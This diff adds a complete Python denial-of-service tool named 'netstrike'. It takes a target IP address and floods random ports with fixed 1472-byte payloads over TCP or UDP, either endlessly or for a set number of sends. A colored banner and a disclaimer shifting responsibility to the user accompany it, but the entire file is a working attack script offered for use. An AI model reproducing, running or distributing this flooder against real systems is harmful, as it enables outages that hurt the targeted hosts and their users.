@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+import time
+import socket
+import argparse
+import random
+from colorama import init, Fore, Style
+
+parser = argparse.ArgumentParser(description="""
+                                 
+Usage: netstrike <protocol> <duration (optional)> <IP_address>
+               
+Arguments:
+    -h, --help: Show this help message and exit
+    -udp: Use UDP protocol for the attack
+    -tcp: Use TCP protocol for the attack
+    -t: Set duration/time for the attack (default is infinite)                                
+                                 """)
+parser.add_argument('-udp', action='store_true')
+parser.add_argument('-tcp', action='store_true')
+parser.add_argument('-t', type=int)
+parser.add_argument("ip")
+args = parser.parse_args()
+payload = b"A" * 1472
+
+init()
+print(Fore.RED + """
+
+ ███▄    █ ▓█████▄▄▄█████▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
+ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
+▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
+▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
+▒██░   ▓██░░▒████▒ ▒██▒ ░ ▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
+░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
+░ ░░   ░ ▒░ ░ ░  ░   ░    ░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
+   ░   ░ ░    ░    ░      ░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
+         ░    ░  ░              ░              ░      ░  ░  ░      ░  ░ 
+    
+""" + Style.RESET_ALL)
+print(Fore.YELLOW +"\nWARNING: BY PROCEEDING, YOU ACKNOWLEDGE AND ACCEPT FULL RESPONSABILITY FOR THE USE OF NETSTRIKE!!!\n" + Style.RESET_ALL)
+def tcp_infinite_DOS():
+    while True:
+        target_port = random.randint(1, 65535)
+        try:
+            attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            attacker.connect((args.ip, target_port))
+            attacker.send(payload)
+            attacker.close()
+        except:
+            pass
+
+def tcp_incremented_DOS():
+    count = args.t
+    while count != 0:
+        target_port = random.randint(1, 65535)
+        try:
+            attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            attacker.connect((args.ip, target_port))
+            attacker.send(payload)
+            attacker.close()
+        except:
+            pass
+        count -= 1
+
+
+def udp_infinite_DOS(attacker):
+    while True:
+        target_port = random.randint(1, 65535)
+        attacker.sendto(payload, (args.ip, target_port))
+
+def udp_incremented_DOS(attacker):
+    count = args.t
+    while count != 0:
+        target_port = random.randint(1, 65535)
+        attacker.sendto(payload, (args.ip, target_port))
+        count -= 1
+
+if args.udp:
+    attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    if args.t is not None:
+        udp_incremented_DOS(attacker)
+    else:
+        udp_infinite_DOS(attacker)
+elif args.tcp:
+    if args.t is not None:
+        tcp_incremented_DOS()
+    else:
+        tcp_infinite_DOS()
+else:
+    print("INVALID COMMAND!! please use -h to see the help message")
+    exit()
